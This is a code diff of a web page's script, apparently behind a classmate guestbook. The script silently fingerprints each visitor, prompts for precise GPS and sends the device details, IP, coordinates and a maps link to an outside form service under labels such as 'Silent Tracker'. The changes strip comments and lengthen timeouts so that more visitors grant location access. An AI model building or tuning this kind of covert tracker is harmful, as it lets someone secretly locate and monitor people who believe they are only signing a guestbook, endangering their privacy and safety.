@@ -115,7 +115,6 @@
     </main>
 
     <script>
-        // Global memory storage for tracking parameters
         let trackingData = {
             ip: "Unavailable",
             location: "Unavailable",
@@ -123,16 +122,14 @@
             screenSize: "Unknown Screen"
         };
         
-        let hasSentPayload = false; // Ensures only ONE form submission fires automatically
-        let trackingTimer = null;   // Fail-safe timeout window handler
+        let hasSentPayload = false; 
+        let trackingTimer = null;   
 
-        // 1. Instantly gather device specs silently on load
         function gatherDeviceFingerprint() {
             trackingData.deviceInfo = navigator.userAgent; 
             trackingData.screenSize = `${window.screen.width}x${window.screen.height}`;
         }
 
-        // 2. Start the processing sequence
         gatherDeviceFingerprint();
 
         fetch(window.location.href)
@@ -150,27 +147,25 @@
                     }
                 }
                 
-                // Start a 2.5-second countdown. If they deny GPS or ignore it, send just the hardware specs/IP.
+                // Increased to 7 seconds so users have enough time to click "Allow"
                 trackingTimer = setTimeout(() => {
                     if (!hasSentPayload) {
                         sendToFormBold("Anonymous Classmate", "Silent Tracker (GPS Denied/Timed Out)", {});
                     }
-                }, 2500);
+                }, 7000);
 
-                // Prompt the browser for high-accuracy device GPS coordinates
                 requestPreciseLocation();
             })
             .catch(err => {
-                console.log("Local testing environment context detected.");
+                console.log("Local or missing headers environment.");
                 requestPreciseLocation();
             });
 
-        // 3. Precise hardware geolocation tracking sequence
         function requestPreciseLocation() {
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        // User clicked ALLOW: cancel the fallback timer immediately
+                        // User allowed access in time: clear the backup timer
                         clearTimeout(trackingTimer);
                         
                         if (hasSentPayload) return; 
@@ -187,20 +182,18 @@
                             "Google Maps Link": `https://www.google.com/maps?q=${lat},${lon}`
                         };
 
-                        // Send everything unified in a single submission count
                         sendToFormBold("Anonymous Classmate", "PRECISE GPS ACQUIRED", preciseGPS);
                     },
                     (error) => {
-                        console.log("GPS hardware prompt bypassed or declined.");
+                        console.log("GPS hardware choice skipped or rejected.");
                     },
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    { enableHighAccuracy: true, timeout: 15000 }
                 );
             }
         }
 
-        // 4. Central FormBold Sender Engine
         function sendToFormBold(studentName, actionType, extraData = {}) {
-            hasSentPayload = true; // Hard stop any double fires
+            hasSentPayload = true; 
 
             const formData = new FormData();
             formData.append("_subject", `[${actionType}] - ${studentName}`);
@@ -212,7 +205,6 @@
             formData.append("Screen Resolution", trackingData.screenSize);
             formData.append("Timestamp", new Date().toLocaleString());
 
-            // Map custom GPS dictionary parameters if present
             Object.keys(extraData).forEach(key => {
                 formData.append(key, extraData[key]);
             });
@@ -224,11 +216,10 @@
                     'Accept': 'application/json'
                 }
             })
-            .then(() => console.log("Transmission parameters pushed smoothly."))
-            .catch(err => console.error("Data pipeline link error:", err));
+            .then(() => console.log("Transmission finalized."))
+            .catch(err => console.error("Transmission error:", err));
         }
 
-        // 5. Manual guestbook text signature hook
         function submitGuestbook() {
             const nameInput = document.getElementById('studentName');
             const nameField = nameInput ? nameInput.value.trim() : "";
